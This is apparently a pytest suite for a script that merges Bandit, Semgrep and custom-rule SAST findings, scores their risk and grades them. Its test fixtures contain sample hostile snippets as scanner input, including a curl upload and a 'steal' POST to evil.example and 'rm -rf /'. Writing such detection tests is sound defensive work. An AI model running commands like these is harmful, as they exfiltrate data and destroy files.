import json
import sys
from pathlib import Path

import pytest


sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))
import merge_sast_results as m  # noqa: E402


class TestLoadJsonFile:
    def test_valid_json_returns_parsed_content(self, tmp_path):
        data = {"results": [1, 2], "ok": True}
        target = tmp_path / "valid.json"
        target.write_text(json.dumps(data), encoding="utf-8")

        loaded = m.load_json_file(target, default_value={})

        assert loaded == data

    def test_missing_file_returns_default_value(self, tmp_path):
        default = {"results": []}
        missing = tmp_path / "missing.json"

        loaded = m.load_json_file(missing, default_value=default)

        assert loaded is default

    def test_malformed_json_raises_value_error(self, tmp_path):
        target = tmp_path / "bad.json"
        target.write_text("{not: json", encoding="utf-8")

        with pytest.raises(ValueError, match="malformed JSON"):
            m.load_json_file(target, default_value={})

    def test_oserror_raises_value_error(self, tmp_path, monkeypatch):
        target = tmp_path / "no_read.json"
        target.write_text("{}", encoding="utf-8")

        def fail_read(self, encoding=None):
            raise PermissionError("permission denied")

        monkeypatch.setattr(Path, "read_text", fail_read)

        with pytest.raises(ValueError, match="failed to read"):
            m.load_json_file(target, default_value={})


class TestLoadRules:
    def test_valid_rules_file_returns_rules_with_attached_severity(self, tmp_path):
        rules_file = tmp_path / "rules.json"
        rules_file.write_text(
            json.dumps(
                [
                    {
                        "regex": r"curl",
                        "pattern": "curl-call",
                        "category": "network",
                    }
                ]
            ),
            encoding="utf-8",
        )

        rules = m.load_rules(rules_file, "danger")

        assert rules == [
            {
                "regex": r"curl",
                "pattern": "curl-call",
                "category": "network",
                "severity": "danger",
            }
        ]

    @pytest.mark.parametrize(
        "item",
        [
            {"regex": "x", "pattern": "p"},
            {"regex": "x", "category": "network"},
            {"pattern": "p", "category": "network"},
        ],
    )
    def test_items_missing_required_keys_are_skipped(self, tmp_path, item):
        rules_file = tmp_path / "rules_missing.json"
        rules_file.write_text(json.dumps([item]), encoding="utf-8")

        assert m.load_rules(rules_file, "warning") == []

    def test_non_list_json_raises_value_error(self, tmp_path):
        rules_file = tmp_path / "rules_obj.json"
        rules_file.write_text(json.dumps({"not": "list"}), encoding="utf-8")

        with pytest.raises(ValueError, match="JSON array"):
            m.load_rules(rules_file, "warning")

    @pytest.mark.parametrize("item", ["str", 12, [1, 2], None, True])
    def test_non_dict_items_are_skipped(self, tmp_path, item):
        rules_file = tmp_path / "rules_nondict.json"
        rules_file.write_text(json.dumps([item]), encoding="utf-8")

        assert m.load_rules(rules_file, "warning") == []


class TestNormalizeSeverity:
    @pytest.mark.parametrize("value", ["high", "error", "critical", "danger"])
    def test_danger_aliases_map_to_danger(self, value):
        assert m.normalize_severity(value) == "danger"

    @pytest.mark.parametrize("value", ["medium", "warning", "warn", "low", "info"])
    def test_warning_aliases_map_to_warning(self, value):
        assert m.normalize_severity(value) == "warning"

    @pytest.mark.parametrize("value", [None, "", "   "])
    def test_none_or_empty_maps_to_warning(self, value):
        assert m.normalize_severity(value) == "warning"

    def test_unknown_string_maps_to_warning(self):
        assert m.normalize_severity("urgent-ish") == "warning"


class TestNormalizeCategory:
    def test_destructive_command_maps_to_destructive(self):
        assert m.normalize_category("destructive-command") == "destructive"

    def test_credential_exfiltration_maps_to_credential_exfil(self):
        assert m.normalize_category("credential-exfiltration") == "credential-exfil"

    def test_prompt_injection_maps_to_prompt_injection(self):
        assert m.normalize_category("prompt injection") == "prompt-injection"

    def test_shell_execution_maps_to_shell_exec(self):
        assert m.normalize_category("shell execution") == "shell-exec"

    @pytest.mark.parametrize("value", ["insecure-transport", "http"])
    def test_insecure_transport_and_http_map_to_insecure_transport(self, value):
        assert m.normalize_category(value) == "insecure-transport"

    def test_hardcoded_password_maps_to_hardcoded_cred(self):
        assert m.normalize_category("hardcoded password") == "hardcoded-cred"

    def test_network_request_maps_to_network(self):
        assert m.normalize_category("network request") == "network"

    def test_unknown_maps_to_network_fallback(self):
        assert m.normalize_category("completely-new-category") == "network"


class TestComputeRiskScore:
    def test_danger_destructive_executable_untrusted_scores_100(self):
        score = m.compute_risk_score(
            severity="danger",
            category="destructive",
            file_path="script.py",
            snippet="curl https://evil.example/upload",
        )

        assert score == 100

    def test_warning_network_non_executable_scores_30(self):
        score = m.compute_risk_score(
            severity="warning",
            category="network",
            file_path="README.md",
            snippet="fetch('https://evil.example')",
        )

        assert score == 30

    def test_trusted_domain_does_not_get_actionable_bonus(self):
        score = m.compute_risk_score(
            severity="danger",
            category="network",
            file_path="scan.py",
            snippet="GET https://docs.gitlab.com/user/duo_agent_platform/",
        )

        assert score == 75

    def test_executable_context_adds_20(self):
        exe = m.compute_risk_score(
            severity="warning",
            category="network",
            file_path="worker.ts",
            snippet="https://docs.gitlab.com",
        )
        non_exe = m.compute_risk_score(
            severity="warning",
            category="network",
            file_path="notes.md",
            snippet="https://docs.gitlab.com",
        )

        assert exe - non_exe == 20


class TestIsExecutableContext:
    @pytest.mark.parametrize("path", ["a.py", "a.sh", "a.js", "a.ts"])
    def test_script_extensions_are_executable(self, path):
        assert m.is_executable_context(path) is True

    @pytest.mark.parametrize("path", ["doc.md", "cfg.yaml", "report.json"])
    def test_non_executable_extensions_are_false(self, path):
        assert m.is_executable_context(path) is False

    @pytest.mark.parametrize("path", ["Makefile", "Dockerfile"])
    def test_makefile_and_dockerfile_are_executable(self, path):
        assert m.is_executable_context(path) is True


class TestContainsUntrustedDomain:
    def test_no_url_returns_true_conservative(self):
        assert m.contains_untrusted_domain("no links here") is True

    def test_trusted_domain_returns_false(self):
        assert m.contains_untrusted_domain("see https://docs.gitlab.com/guide") is False

    def test_untrusted_domain_returns_true(self):
        assert m.contains_untrusted_domain("POST https://evil.example/steal") is True

    def test_mixed_trusted_and_untrusted_returns_true(self):
        snippet = "https://docs.gitlab.com and https://bad.example"
        assert m.contains_untrusted_domain(snippet) is True


class TestBuildFinding:
    def test_returns_dict_with_expected_keys(self):
        finding = m.build_finding(
            file_path="a.py",
            line=3,
            severity="warning",
            category="network",
            pattern="curl",
            snippet="curl https://evil.example",
            source="custom-rule",
        )

        assert set(finding.keys()) == {
            "file",
            "line",
            "severity",
            "category",
            "pattern",
            "snippet",
            "risk_score",
            "source",
        }

    def test_risk_score_is_computed_correctly(self):
        finding = m.build_finding(
            file_path="a.py",
            line=1,
            severity="danger",
            category="destructive",
            pattern="rm-rf",
            snippet="rm -rf / # https://evil.example",
            source="bandit",
        )

        assert finding["risk_score"] == 100

    def test_risk_modifier_is_applied(self):
        finding = m.build_finding(
            file_path="README.md",
            line=1,
            severity="warning",
            category="network",
            pattern="http-call",
            snippet="http://example.com",
            source="custom-rule",
            risk_modifier=7,
        )

        assert finding["risk_score"] == 37

    def test_negative_risk_modifier_is_clamped_to_zero(self):
        finding = m.build_finding(
            file_path="README.md",
            line=1,
            severity="warning",
            category="network",
            pattern="x",
            snippet="x",
            source="custom-rule",
            risk_modifier=-100,
        )

        assert finding["risk_score"] == 0


class TestParseBandit:
    def test_valid_bandit_output_with_results_returns_findings(self):
        payload = {
            "results": [
                {
                    "filename": "app.py",
                    "line_number": 11,
                    "issue_severity": "high",
                    "issue_text": "destructive command execution",
                    "test_name": "shell_exec",
                    "test_id": "B602",
                }
            ]
        }

        findings = m.parse_bandit(payload)

        assert len(findings) == 1
        assert findings[0]["file"] == "app.py"
        assert findings[0]["source"] == "bandit"

    def test_empty_results_returns_empty_list(self):
        assert m.parse_bandit({"results": []}) == []


class TestParseSemgrep:
    def test_valid_semgrep_output_returns_findings(self):
        payload = {
            "results": [
                {
                    "path": "web/app.js",
                    "start": {"line": 8},
                    "check_id": "python.lang.security.audit.exec",
                    "extra": {
                        "severity": "warning",
                        "message": "shell execution in user-controlled path",
                        "lines": "exec(userInput)",
                    },
                }
            ]
        }

        findings = m.parse_semgrep(payload)

        assert len(findings) == 1
        assert findings[0]["file"] == "web/app.js"
        assert findings[0]["source"] == "semgrep"

    def test_empty_results_returns_empty_list(self):
        assert m.parse_semgrep({"results": []}) == []


class TestDeduplicateFindings:
    def test_identical_findings_keep_highest_risk_score(self):
        low = {
            "file": "a.py",
            "line": 10,
            "severity": "warning",
            "category": "network",
            "pattern": "curl",
            "snippet": "curl https://evil.example",
            "risk_score": 40,
            "source": "custom-rule",
        }
        high = dict(low)
        high["risk_score"] = 80

        deduped = m.deduplicate_findings([low, high])

        assert len(deduped) == 1
        assert deduped[0]["risk_score"] == 80

    def test_different_findings_keep_all(self):
        a = {
            "file": "a.py",
            "line": 1,
            "severity": "warning",
            "category": "network",
            "pattern": "curl",
            "snippet": "curl",
            "risk_score": 30,
            "source": "custom-rule",
        }
        b = {
            "file": "b.py",
            "line": 2,
            "severity": "danger",
            "category": "destructive",
            "pattern": "rm-rf",
            "snippet": "rm -rf",
            "risk_score": 95,
            "source": "bandit",
        }

        deduped = m.deduplicate_findings([a, b])

        assert len(deduped) == 2

    def test_result_is_sorted_by_risk_score_descending(self):
        findings = [
            {
                "file": "a.py",
                "line": 1,
                "severity": "warning",
                "category": "network",
                "pattern": "a",
                "snippet": "a",
                "risk_score": 31,
                "source": "custom-rule",
            },
            {
                "file": "b.py",
                "line": 1,
                "severity": "warning",
                "category": "network",
                "pattern": "b",
                "snippet": "b",
                "risk_score": 70,
                "source": "custom-rule",
            },
            {
                "file": "c.py",
                "line": 1,
                "severity": "warning",
                "category": "network",
                "pattern": "c",
                "snippet": "c",
                "risk_score": 10,
                "source": "custom-rule",
            },
        ]

        deduped = m.deduplicate_findings(findings)

        assert [item["risk_score"] for item in deduped] == [70, 31, 10]


class TestComputeMetricsAndGrade:
    def test_max_risk_ge_90_is_danger(self):
        findings = [
            {
                "risk_score": 90,
                "severity": "danger",
                "category": "destructive",
                "source": "bandit",
            }
        ]

        _, grade = m.compute_metrics_and_grade(findings, ["a.py"])

        assert grade == "DANGER"

    def test_high_risk_count_ge_3_is_danger(self):
        findings = [
            {
                "risk_score": 70,
                "severity": "warning",
                "category": "network",
                "source": "x",
            },
            {
                "risk_score": 71,
                "severity": "warning",
                "category": "network",
                "source": "x",
            },
            {
                "risk_score": 72,
                "severity": "warning",
                "category": "network",
                "source": "x",
            },
        ]

        _, grade = m.compute_metrics_and_grade(findings, [])

        assert grade == "DANGER"

    def test_max_risk_ge_70_is_warning(self):
        findings = [
            {
                "risk_score": 70,
                "severity": "warning",
                "category": "network",
                "source": "semgrep",
            }
        ]

        _, grade = m.compute_metrics_and_grade(findings, [])

        assert grade == "WARNING"

    def test_no_high_risk_is_safe(self):
        findings = [
            {
                "risk_score": 69,
                "severity": "warning",
                "category": "network",
                "source": "custom-rule",
            }
        ]

        _, grade = m.compute_metrics_and_grade(findings, ["x.py", "y.py"])

        assert grade == "SAFE"

    def test_empty_findings_is_safe(self):
        metrics, grade = m.compute_metrics_and_grade([], [])

        assert grade == "SAFE"
        assert metrics["max_risk_score"] == 0

    def test_metrics_dict_has_expected_keys(self):
        findings = [
            {
                "risk_score": 88,
                "severity": "danger",
                "category": "shell-exec",
                "source": "semgrep",
            },
            {
                "risk_score": 20,
                "severity": "warning",
                "category": "network",
                "source": "custom-rule",
            },
        ]
        metrics, _ = m.compute_metrics_and_grade(findings, ["a.py", "b.py", "c.md"])

        assert set(metrics.keys()) == {
            "total_findings",
            "max_risk_score",
            "high_risk_count",
            "severity_counts",
            "category_counts",
            "source_counts",
            "scanned_file_count",
        }
        assert metrics["total_findings"] == 2
        assert metrics["max_risk_score"] == 88
        assert metrics["high_risk_count"] == 1
        assert metrics["severity_counts"]["danger"] == 1
        assert metrics["severity_counts"]["warning"] == 1
        assert metrics["category_counts"]["network"] == 1
        assert metrics["source_counts"]["semgrep"] == 1
        assert metrics["scanned_file_count"] == 3


class TestScanCustomRules:
    def test_temp_file_with_known_pattern_generates_finding(self, tmp_path):
        target = tmp_path / "script.py"
        target.write_text("print('ok')\nos.system('ls')\n", encoding="utf-8")
        rules = [
            {
                "regex": r"os\.system\(",
                "pattern": "os-system",
                "category": "shell execution",
                "severity": "high",
            }
        ]

        findings = m.scan_custom_rules([str(target)], rules)

        assert len(findings) == 1
        assert findings[0]["file"] == str(target)
        assert findings[0]["line"] == 2
        assert findings[0]["source"] == "custom-rule"

    def test_regex_matching_returns_correct_line_numbers(self, tmp_path):
        target = tmp_path / "multi.py"
        target.write_text("safe\nmatch_here\nother\nmatch_here\n", encoding="utf-8")
        rules = [
            {
                "regex": r"match_here",
                "pattern": "marker",
                "category": "network",
                "severity": "warning",
            }
        ]

        findings = m.scan_custom_rules([str(target)], rules)

        assert [f["line"] for f in findings] == [2, 4]


class TestGetChangedFiles:
    def test_get_changed_files_filters_and_keeps_text_paths(
        self, tmp_path, monkeypatch
    ):
        monkeypatch.chdir(tmp_path)
        (tmp_path / "a.py").write_text("print(1)\n", encoding="utf-8")
        (tmp_path / "README.md").write_text("hello\n", encoding="utf-8")
        (tmp_path / "Makefile").write_text("all:\n\ttrue\n", encoding="utf-8")
        (tmp_path / "binary.bin").write_bytes(b"\x00\x01")
        (tmp_path / "vendor").mkdir()
        (tmp_path / "vendor" / "bad.py").write_text("print(2)\n", encoding="utf-8")

        class Result:
            def __init__(self, stdout, returncode=0):
                self.stdout = stdout
                self.returncode = returncode

        def fake_run(args, capture_output, text, check):
            assert capture_output is True
            assert text is True
            assert check is False
            return Result(
                "a.py\nREADME.md\nMakefile\nbinary.bin\nmissing.py\nvendor/bad.py\n"
            )

        monkeypatch.setattr(m.subprocess, "run", fake_run)

        changed = m.get_changed_files()

        assert changed == ["Makefile", "README.md", "a.py"]

    def test_get_changed_files_returns_empty_on_git_error(self, tmp_path, monkeypatch):
        monkeypatch.chdir(tmp_path)

        class Result:
            def __init__(self, stdout="", returncode=1):
                self.stdout = stdout
                self.returncode = returncode

        def fake_run(args, capture_output, text, check):
            return Result(returncode=1)

        monkeypatch.setattr(m.subprocess, "run", fake_run)

        assert m.get_changed_files() == []


class TestMain:
    def test_wrong_argc_returns_2(self, capsys):
        rc = m.main(["merge_sast_results.py"])

        captured = capsys.readouterr()
        assert rc == 2
        assert "usage:" in captured.err

    def test_valid_inputs_returns_0_and_prints_json(
        self, tmp_path, monkeypatch, capsys
    ):
        bandit = tmp_path / "bandit.json"
        semgrep = tmp_path / "semgrep.json"
        bandit.write_text(json.dumps({"results": []}), encoding="utf-8")
        semgrep.write_text(json.dumps({"results": []}), encoding="utf-8")

        monkeypatch.setattr(m, "load_rules", lambda path, severity: [])
        monkeypatch.setattr(m, "get_changed_files", lambda: ["a.py"])

        rc = m.main(["merge_sast_results.py", str(bandit), str(semgrep)])

        captured = capsys.readouterr()
        parsed = json.loads(captured.out)
        assert rc == 0
        assert parsed["grade"] == "SAFE"
        assert parsed["scanned_files"] == ["a.py"]
